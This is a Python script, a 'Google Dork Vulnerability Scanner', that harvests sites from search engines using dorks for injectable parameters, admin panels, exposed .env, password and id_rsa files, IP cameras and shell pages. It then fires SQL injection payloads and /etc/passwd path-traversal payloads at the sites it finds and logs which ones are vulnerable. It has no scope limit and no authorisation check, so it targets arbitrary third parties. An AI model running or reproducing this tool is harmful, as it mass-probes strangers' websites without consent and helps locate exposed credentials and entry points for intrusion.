#!/usr/bin/env python3
"""
██████╗   ██████╗  ██████╗  ██╗  ██╗      ███████╗  ██████╗  █████╗  ███╗   ██╗
██╔══██╗ ██╔═══██╗ ██╔══██╗ ██║ ██╔╝      ██╔════╝ ██╔════╝ ██╔══██╗ ████╗  ██║
██║  ██║ ██║   ██║ ██████╔╝ █████╔╝       ███████╗ ██║      ███████║ ██╔██╗ ██║
██║  ██║ ██║   ██║ ██╔══██╗ ██╔═██╗       ╚════██║ ██║      ██╔══██║ ██║╚██╗██║
██████╔╝ ╚██████╔╝ ██║  ██║ ██║  ██╗      ███████║ ╚██████╗ ██║  ██║ ██║ ╚████║
╚═════╝   ╚═════╝  ╚═╝  ╚═╝ ╚═╝  ╚═╝      ╚══════╝  ╚═════╝ ╚═╝  ╚═╝ ╚═╝  ╚═══╝
                         Google Dork Vulnerability Scanner
"""

import os, sys, re, ssl, time, json, urllib.parse, urllib.request, urllib.error
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
TIMEOUT = 15

# ─── Dork Database ──────────────────────────────────────────────────
DORKS = {
    "sqli": {
        "name": "SQL Injection",
        "dorks": [
            'inurl:"index.php?id="',
            'inurl:"product.php?id="',
            'inurl:"page.php?id="',
            'inurl:"article.php?id="',
            'inurl:"news.php?id="',
            'inurl:"detail.php?id="',
            'inurl:"view.php?id="',
            'inurl:"cat.php?id="',
            'inurl:"content.php?id="',
            'inurl:"show.php?id="',
        ],
    },
    "upload": {
        "name": "File Upload",
        "dorks": [
            'inurl:"upload.php"',
            'inurl:"file_upload.php"',
            'inurl:"upload_file.php"',
            'inurl:"uploader.php"',
            'intitle:"Upload" inurl:"admin"',
            'inurl:"upload" intitle:"file"',
        ],
    },
    "admin": {
        "name": "Admin Panels",
        "dorks": [
            'intitle:"admin login"',
            'inurl:"admin.php"',
            'inurl:"admin/login"',
            'intitle:"admin panel"',
            'inurl:"administrator"',
            'intitle:"control panel"',
            'inurl:"wp-admin"',
            'inurl:"cpanel"',
            'inurl:"webadmin"',
        ],
    },
    "config": {
        "name": "Config Files",
        "dorks": [
            'filetype:env "DB_PASSWORD"',
            'filetype:sql "password"',
            'filetype:txt "password"',
            'filetype:log "password"',
            'filetype:ini "password"',
            'filetype:conf "password"',
            'filetype:json "password"',
            'filetype:yml "password"',
            'intitle:"index of" ".env"',
            'intitle:"index of" "wp-config.php"',
        ],
    },
    "backup": {
        "name": "Backup Files",
        "dorks": [
            'intitle:"index of" "backup"',
            'intitle:"index of" "backup.zip"',
            'intitle:"index of" "backup.sql"',
            'intitle:"index of" ".bak"',
            'filetype:sql "CREATE TABLE"',
            'filetype:zip "backup"',
            'filetype:tar.gz "backup"',
        ],
    },
    "sensitive": {
        "name": "Sensitive Files",
        "dorks": [
            'intitle:"index of" "id_rsa"',
            'intitle:"index of" "id_rsa.pub"',
            'intitle:"index of" "htpasswd"',
            'intitle:"index of" "passwords"',
            'intitle:"index of" "credentials"',
            'intitle:"index of" "secret"',
            'intitle:"index of" "private"',
            'intitle:"index of" "confidential"',
        ],
    },
    "phpinfo": {
        "name": "PHP Info",
        "dorks": [
            'intitle:"phpinfo()"',
            'inurl:"phpinfo.php"',
            'ext:php intitle:"phpinfo"',
        ],
    },
    "error": {
        "name": "Error Messages",
        "dorks": [
            'intext:"sql syntax" intext:"mysql"',
            'intext:"warning: mysql"',
            'intext:"unclosed quotation mark"',
            'intext:"odbc drivers error"',
            'intext:"microsoft ole db"',
            'intext:"postgresql" "error"',
            'intext:"stack trace"',
            'intext:"exception" "trace"',
        ],
    },
    "camera": {
        "name": "IP Cameras",
        "dorks": [
            'intitle:"webcamXP"',
            'intitle:"live view" "axis"',
            'inurl:"view/index.shtml"',
            'inurl:"CgiStart?page="',
            'intitle:"Network Camera"',
        ],
    },
    "rce": {
        "name": "RCE Points",
        "dorks": [
            'inurl:"cmd.php"',
            'inurl:"exec.php"',
            'inurl:"command.php"',
            'inurl:"shell.php"',
            'inurl:"console.php"',
            'inurl:"terminal.php"',
        ],
    },
    "lfi": {
        "name": "LFI Points",
        "dorks": [
            'inurl:"page=" filetype:php',
            'inurl:"file=" filetype:php',
            'inurl:"include=" filetype:php',
            'inurl:"path=" filetype:php',
            'inurl:"dir=" filetype:php',
            'inurl:"document=" filetype:php',
            'inurl:"folder=" filetype:php',
        ],
    },
    "xss": {
        "name": "XSS Points",
        "dorks": [
            'inurl:"search.php?q="',
            'inurl:"search.php?query="',
            'inurl:"search.php?s="',
            'inurl:"search.php?keyword="',
            'inurl:"index.php?search="',
        ],
    },
    "open_redirect": {
        "name": "Open Redirects",
        "dorks": [
            'inurl:"redirect.php?url="',
            'inurl:"redirect?url="',
            'inurl:"redir.php?url="',
            'inurl:"goto.php?url="',
            'inurl:"link.php?url="',
            'inurl:"out.php?url="',
        ],
    },
}

# ─── HTTP ───────────────────────────────────────────────────────────
def fetch(url, timeout=TIMEOUT):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    req = urllib.request.Request(url, headers={"User-Agent": UA})
    try:
        resp = urllib.request.urlopen(req, timeout=timeout, context=ctx)
        body = resp.read().decode("utf-8", errors="replace")[:10000]
        return resp.status, dict(resp.headers), body, resp.url
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace")[:2000] if e.fp else ""
        return e.code, dict(e.headers), body, e.url
    except Exception as e:
        return 0, {}, str(e), url

def search_google(dork, max_results=30):
    """Search Google for a dork and extract URLs."""
    urls = []
    query = urllib.parse.quote(dork)

    # Use multiple search backends
    backends = [
        f"https://www.google.com/search?q={query}&num=30&start=0",
        f"https://search.brave.com/search?q={query}&count=30",
    ]

    for backend in backends:
        try:
            s, h, b, _ = fetch(backend, timeout=20)
            if s != 200:
                continue

            # Extract URLs from search results
            # Google: href="/url?q=REALURL"
            url_patterns = [
                r'/url\?q=(https?://[^&"\']+)',
                r'<a[^>]+href="(https?://[^"]+)"',
                r'"(https?://[^\s"]+)"',
            ]

            for pattern in url_patterns:
                found = re.findall(pattern, b)
                for u in found:
                    u = urllib.parse.unquote(u)
                    # Filter out google/bing/search engine URLs
                    skip_domains = ["google.com", "google.co", "bing.com", "yahoo.com",
                                    "brave.com", "duckduckgo.com", "yandex", "baidu.com"]
                    if any(sd in u.lower() for sd in skip_domains):
                        continue
                    if u.startswith("http") and len(u) < 500:
                        urls.append(u)

            if urls:
                break
        except Exception:
            continue

    return list(set(urls))[:max_results]

# ─── Vulnerability Checks ──────────────────────────────────────────
def check_sqli_point(url):
    """Check if a URL has SQLi potential."""
    sqli_tests = [
        {"payload": "'", "detect": ["sql", "syntax", "error", "mysql", "postgresql", "odbc", "unclosed"]},
        {"payload": '"', "detect": ["sql", "syntax", "error", "mysql"]},
        {"payload": "1' OR '1'='1", "detect": ["mysql", "sql", "error"]},
        {"payload": "1';--", "detect": ["sql", "syntax", "error"]},
    ]

    for test in sqli_tests:
        try:
            # Add payload to URL
            if "?" in url:
                test_url = url + test["payload"]
            else:
                test_url = url + "?id=" + test["payload"]

            s, h, b, _ = fetch(test_url, timeout=10)
            if any(detect in b.lower() for detect in test["detect"]):
                return True, test["payload"], b[:300]
        except Exception:
            continue

    return False, None, None

def check_file_upload(url):
    """Check if upload page is accessible and potentially vulnerable."""
    s, h, b, _ = fetch(url, timeout=10)
    if s == 200:
        upload_indicators = ["upload", "file", "browse", "submit", "form", "input type=\"file\""]
        score = sum(1 for ind in upload_indicators if ind in b.lower())
        if score >= 2:
            return True, score
    return False, 0

def check_admin_panel(url):
    """Check if admin panel is accessible."""
    s, h, b, final_url = fetch(url, timeout=10)
    if s == 200:
        admin_indicators = ["login", "password", "username", "admin", "dashboard", "sign in", "log in"]
        score = sum(1 for ind in admin_indicators if ind in b.lower())
        if score >= 2:
            return True, score, final_url
    elif s == 401:
        return True, 1, url  # Auth required = admin panel exists
    return False, 0, url

def check_config_exposure(url):
    """Check if config file is exposed."""
    s, h, b, _ = fetch(url, timeout=10)
    if s == 200:
        sensitive = ["password", "secret", "key", "token", "api_key", "database", "host", "user", "db_"]
        found = [kw for kw in sensitive if kw in b.lower()]
        if found:
            return True, found, len(b)
    return False, [], 0

def check_phpinfo(url):
    """Check if phpinfo is exposed."""
    s, h, b, _ = fetch(url, timeout=10)
    if s == 200 and ("php version" in b.lower() or "phpinfo" in b.lower() or "php.ini" in b.lower()):
        return True
    return False

def check_rce_point(url):
    """Check if there's a potential RCE endpoint."""
    s, h, b, _ = fetch(url, timeout=10)
    if s == 200:
        rce_indicators = ["exec", "shell_exec", "system", "passthru", "popen", "eval", "cmd", "command"]
        if any(ind in b.lower() for ind in rce_indicators):
            return True
    return False

# ─── Scanner ────────────────────────────────────────────────────────
def scan_url(args):
    """Scan a single URL with vulnerability checks."""
    url, category = args
    result = {
        "url": url,
        "category": category,
        "status": 0,
        "vulnerable": False,
        "findings": [],
    }

    # Basic HTTP check
    s, h, b, final_url = fetch(url)
    result["status"] = s
    result["final_url"] = final_url

    if s == 0:
        result["error"] = b[:100]
        return result

    # Run category-specific checks
    if category == "sqli":
        vuln, payload, evidence = check_sqli_point(url)
        if vuln:
            result["vulnerable"] = True
            result["findings"].append({"type": "sqli", "payload": payload, "evidence": evidence})

    elif category == "upload":
        vuln, score = check_file_upload(url)
        if vuln:
            result["vulnerable"] = True
            result["findings"].append({"type": "file_upload", "score": score})

    elif category == "admin":
        vuln, score, panel_url = check_admin_panel(url)
        if vuln:
            result["vulnerable"] = True
            result["findings"].append({"type": "admin_panel", "score": score, "url": panel_url})

    elif category == "config":
        vuln, keywords, size = check_config_exposure(url)
        if vuln:
            result["vulnerable"] = True
            result["findings"].append({"type": "config_exposure", "keywords": keywords, "size": size})

    elif category == "phpinfo":
        vuln = check_phpinfo(url)
        if vuln:
            result["vulnerable"] = True
            result["findings"].append({"type": "phpinfo_exposure"})

    elif category == "rce":
        vuln = check_rce_point(url)
        if vuln:
            result["vulnerable"] = True
            result["findings"].append({"type": "rce_potential"})

    elif category == "lfi":
        # Quick LFI test
        lfi_payloads = ["../../../../etc/passwd", "....//....//....//etc/passwd"]
        for payload in lfi_payloads:
            test_url = url.replace("=", f"={payload}")
            s2, h2, b2, _ = fetch(test_url, timeout=10)
            if s2 == 200 and ("root:" in b2 or "bin/" in b2):
                result["vulnerable"] = True
                result["findings"].append({"type": "lfi", "payload": payload})
                break

    elif category == "error":
        # Error messages already shown in HTTP response
        error_indicators = ["sql", "syntax", "stack trace", "exception", "fatal error", "warning:", "notice:"]
        if any(ind in b.lower() for ind in error_indicators):
            result["vulnerable"] = True
            result["findings"].append({"type": "error_disclosure"})

    elif category in ["backup", "sensitive", "camera", "xss", "open_redirect"]:
        if s == 200 and len(b) > 100:
            result["vulnerable"] = True
            result["findings"].append({"type": f"{category}_exposure"})

    return result

# ─── Main ───────────────────────────────────────────────────────────
def print_banner():
    print("""
    D O R K    S C A N N E R
    Google Dork Vulnerability Scanner v2.0
    """)

def main():
    print_banner()

    # Show categories
    print("  Available Dork Categories:")
    print("  " + "─" * 50)
    cats = list(DORKS.keys())
    for i, cat in enumerate(cats, 1):
        d = DORKS[cat]
        print(f"  [{i:2d}] {d['name']:<25s} ({len(d['dorks'])} dorks)")

    print(f"  [A]  ALL CATEGORIES")
    print(f"  [C]  CUSTOM DORK")
    print(f"  [0]  EXIT")
    print()

    choice = input("  Select category: ").strip().upper()

    if choice == "0":
        print("  Exiting...")
        return

    # Select categories
    selected_cats = []
    if choice == "A":
        selected_cats = cats
    elif choice == "C":
        custom = input("  Enter dork: ").strip()
        if custom:
            DORKS["custom"] = {"name": "Custom", "dorks": [custom]}
            selected_cats = ["custom"]
    elif choice.isdigit() and 1 <= int(choice) <= len(cats):
        selected_cats = [cats[int(choice) - 1]]
    else:
        print("  Invalid choice")
        return

    max_results = input("  Max results per dork (default 30): ").strip()
    max_results = int(max_results) if max_results.isdigit() else 30

    threads = input("  Threads (default 20): ").strip()
    threads = int(threads) if threads.isdigit() else 20

    print(f"\n  Searching {len(selected_cats)} categories...")
    print("  " + "═" * 50)

    all_urls = {}
    for cat in selected_cats:
        d = DORKS[cat]
        print(f"\n  [{d['name']}]")
        for dork in d["dorks"]:
            print(f"    Dork: {dork}")
            urls = search_google(dork, max_results)
            print(f"    Found: {len(urls)} URLs")
            all_urls.setdefault(cat, []).extend(urls)
            time.sleep(1)  # Rate limit

    # Deduplicate
    for cat in all_urls:
        all_urls[cat] = list(set(all_urls[cat]))

    total_urls = sum(len(v) for v in all_urls.values())
    print(f"\n  Total unique URLs: {total_urls}")
    print(f"  Scanning...")
    print("  " + "═" * 50)

    # Scan all URLs
    all_results = []
    scan_tasks = []
    for cat, urls in all_urls.items():
        for url in urls:
            scan_tasks.append((url, cat))

    with ThreadPoolExecutor(max_workers=threads) as ex:
        futures = {ex.submit(scan_url, task): task for task in scan_tasks}
        for i, future in enumerate(as_completed(futures), 1):
            task = futures[future]
            try:
                result = future.result()
                all_results.append(result)
                if result["vulnerable"]:
                    findings = ", ".join(f["type"] for f in result["findings"])
                    print(f"  [{i}/{len(scan_tasks)}] VULN: {result['url']} ({findings})")
                else:
                    print(f"  [{i}/{len(scan_tasks)}] OK: {result['url']}", end="\r")
            except Exception as e:
                print(f"  [{i}/{len(scan_tasks)}] ERR: {task[0]} — {e}")

    # Summary
    vulns = [r for r in all_results if r["vulnerable"]]
    print(f"\n\n  " + "═" * 50)
    print(f"  SCAN COMPLETE")
    print(f"  " + "═" * 50)
    print(f"  Total scanned: {len(all_results)}")
    print(f"  Vulnerable:    {len(vulns)}")
    print(f"  Not vulnerable: {len(all_results) - len(vulns)}")

    if vulns:
        print(f"\n  Vulnerable URLs:")
        for v in vulns[:50]:
            findings = ", ".join(f["type"] for f in v["findings"])
            print(f"    {v['url']}")
            print(f"      → {findings}")

        # Save results
        output_file = f"dork_scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(output_file, "w") as f:
            json.dump([r for r in all_results if r["vulnerable"]], f, indent=2)
        print(f"\n  Saved to: {output_file}")

    print()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n  Interrupted. Exiting...\n")
        sys.exit(0)